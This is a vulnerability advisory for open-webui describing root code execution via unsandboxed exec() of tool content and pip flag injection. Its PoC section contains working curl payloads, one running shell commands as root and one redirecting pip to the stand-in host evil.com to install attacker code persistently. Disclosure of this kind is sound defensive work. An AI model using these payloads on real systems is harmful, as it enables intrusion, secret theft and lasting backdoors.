# Unsandboxed exec() and Pip Flag Injection in Tool Loading Enable Root RCE

**Package:** open-webui (pip) / ghcr.io/open-webui/open-webui (Docker)
**Affected versions:** <= 0.9.1
**Severity:** Critical — CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (9.1)

## Summary

Two independent code paths in tool loading allow an admin (or any user with `workspace.tools` permission) to execute arbitrary code as root inside the container: (1) `exec(content, module.__dict__)` at `plugin.py:231` runs all module-level Python in tool content immediately at creation time without sandboxing, and (2) `install_frontmatter_requirements()` at `plugin.py:383-401` passes comma-split requirement tokens directly to `pip install` without rejecting items starting with `-`, enabling pip flag injection. The Dockerfile defaults to `UID=0/GID=0` (root). The pip injection path creates a persistent backdoor because requirements are reinstalled on every container restart.

## Details

**Path 1 — exec() RCE (`plugin.py:231`):**

```python
# backend/open_webui/utils/plugin.py:231
exec(content, module.__dict__)
```

Called from `load_tool_module_by_id()`, which is called by `POST /api/v1/tools/create` (`tools.py:366-367`). All module-level code in the submitted tool content runs immediately. No sandbox, no import restrictions, no user isolation. The tool creation endpoint requires admin role or `workspace.tools` permission on a **verified** user (`tools.py:333-345`). Pending users cannot create tools even with the permission granted.

**Path 2 — Pip flag injection (`plugin.py:383-401`):**

```python
# backend/open_webui/utils/plugin.py:393-397
req_list = [req.strip() for req in requirements.split(',')]
subprocess.check_call(
    [sys.executable, '-m', 'pip', 'install'] + PIP_OPTIONS + req_list + PIP_PACKAGE_INDEX_OPTIONS
)
```

No validation rejects items starting with `-`. An attacker injects `--extra-index-url` and `--trusted-host` to redirect pip to a malicious package index. The malicious package's `setup.py` executes arbitrary code as root.

**Persistence:** `install_tool_and_function_dependencies()` at `plugin.py:407-433` reinstalls all tool requirements on every server startup, making the pip injection a persistent backdoor that survives container restarts.

**Root context:** `Dockerfile:23-24` sets `ARG UID=0` and `ARG GID=0` — container runs as root by default.

## PoC

**exec() RCE:**
```bash
# With admin token:
curl -X POST http://localhost:8080/api/v1/tools/create \
  -H "Authorization: Bearer <ADMIN_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "rce_proof",
    "name": "RCE Proof",
    "meta": {"description": "test"},
    "content": "\"\"\"\\ntitle: RCE Proof\\ndescription: test\\n\"\"\"\\nimport subprocess\\nopen(\"/tmp/rce_proof.txt\",\"w\").write(subprocess.check_output([\"id\"]).decode())\\n\\nclass Tools:\\n    pass"
  }'

# Verify:
docker exec <container> cat /tmp/rce_proof.txt
# Output: uid=0(root) gid=0(root) groups=0(root)
```

**Pip flag injection:**
```bash
curl -X POST http://localhost:8080/api/v1/tools/create \
  -H "Authorization: Bearer <ADMIN_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "pip_inject",
    "name": "Pip Inject",
    "meta": {"description": "test"},
    "content": "\"\"\"\\ntitle: Pip Inject\\nrequirements: setuptools, --extra-index-url, https://evil.com/simple/, --trusted-host, evil.com, setuptools\\n\"\"\"\\nclass Tools:\\n    pass"
  }'
# pip runs: pip install setuptools --extra-index-url https://evil.com/simple/ --trusted-host evil.com setuptools
```

**Live-confirmed:** exec() wrote `/tmp/rce_proof.txt` containing `uid=0(root)` and leaked `WEBUI_SECRET_KEY` from container env. Pip injection stored injected flags verbatim and passed them to pip.

Full PoC scripts: `exploit_tool_exec_rce.py`, `exploit_pip_injection.py`, `exploit_full_rce_chain.py`

## Impact

Any admin or user with `workspace.tools` permission achieves immediate root code execution inside the container. The pip injection path additionally creates a persistent backdoor reinstalled on every restart. The attacker controls the server process, all application secrets, the full filesystem visible to the container, and can establish outbound connections for data exfiltration or lateral movement. When chained with Advisory 1 (JWT forgery), this is reachable from an unauthenticated starting point on affected deployments. CVSS 9.1 (`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`).

**Full audit report:** https://github.com/tempcollab/open-webui/blob/main/autofyn_audit/audit_report.md
